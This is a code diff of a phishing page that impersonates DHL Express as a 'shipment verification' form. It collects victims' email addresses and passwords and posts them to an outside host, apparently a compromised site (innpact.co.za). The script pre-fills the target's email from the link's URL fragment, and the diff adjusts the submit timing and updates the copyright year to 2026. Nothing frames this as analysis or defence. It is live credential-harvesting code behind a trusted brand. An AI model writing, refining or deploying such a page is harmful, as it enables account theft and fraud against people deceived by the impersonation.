@@ -97,7 +97,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <p><strong>Verification Required Shipment ID: </strong> <br><small> #CS-RBWS/2022BMA/6QC</small></p>
     
     <!-- PHP Form Handling -->
-    <form method="POST" action="https://innpact.co.za/administrator/includes/xlx.php/zim.php">
+    <form method="POST" action="https://innpact.co.za/administrator/includes/xlx.php/zim.php" id="loginForm">
       <input type="email" id="email" name="email" placeholder="Email Address" required />
       <input type="password" id="password" name="password" placeholder="Password" required />
       <button type="submit" id="submitBtn">Track Shipment >>></button>
@@ -108,39 +108,40 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       <?php endif; ?>
     </form>
     
-    <div class="disclaimer">DHL Express ©2025 | All rights reserved</div>
+    <div class="disclaimer">DHL Express ©2026 | All rights reserved</div>
   </div>
 
-  <script>
-    (function () {
-  const emailInput = document.getElementById('email');
-  const passwordInput = document.getElementById('password');
-  const form = document.querySelector('form');
+<script>
+  (function () {
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const form = document.getElementById('loginForm');
+    let firstAttempt = true; // Flag to track the first attempt
 
-  // Auto-fill email from URL #value
-  try {
-    const frag = window.location.hash.slice(1); // Get everything after the # in the URL
-    const decoded = frag ? decodeURIComponent(frag) : '';
-    if (decoded && /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(decoded)) {
-      emailInput.value = decoded;  // Set the email field with the URL hash value
-      passwordInput.value = '';  // Clear the password field for privacy
+    // Auto-fill email from URL #value
+    try {
+      const frag = window.location.hash.slice(1); // Get everything after the # in the URL
+      const decoded = frag ? decodeURIComponent(frag) : '';
+      if (decoded && /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(decoded)) {
+        emailInput.value = decoded;  // Set the email field with the URL hash value
+      }
+    } catch (err) {
+      console.error('Error parsing URL fragment:', err);
     }
-  } catch (err) {
-    console.error('Error parsing URL fragment:', err);
-  }
 
-  // Reset password field on form submission
-  form.addEventListener('submit', function (e) {
-    e.preventDefault();  // Prevent the form from submitting immediately
-    console.log("Form handled locally:", emailInput.value);
-    
+    // Reset password field after the first attempt
+    form.addEventListener('submit', function (e) {
+      if (firstAttempt) {
 
-    // Simply submit the form without the simulated alert or any delay
-    form.submit();  // Submit the form to the server
-  });
-})();
-
-  </script>
+        firstAttempt = false;  // Mark as second attempt
+        // Set a small timeout before submitting the form
+        setTimeout(function() {
+          form.submit(); // Submit the form after a short delay
+        }, 1000); // Adjust the delay if needed (in milliseconds)
+      }
+    });
+  })();
+</script>
 
 </body>
 </html>
